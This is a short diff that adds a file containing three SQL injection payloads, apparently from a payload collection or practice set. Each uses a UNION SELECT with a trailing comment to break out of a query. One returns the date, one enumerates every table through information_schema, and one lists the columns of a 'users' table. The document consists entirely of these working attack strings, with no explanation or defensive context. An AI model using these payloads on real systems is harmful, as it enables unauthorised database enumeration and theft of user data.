@@ -1,0 +1,6 @@
+
+' UNION select '0',0,getdate() --
+
+' UNION select table_name,-999,getdate() FROM information_schema.tables--
+
+' UNION select column_name,-999,getdate() FROM information_schema.columns where table_name = 'users'--
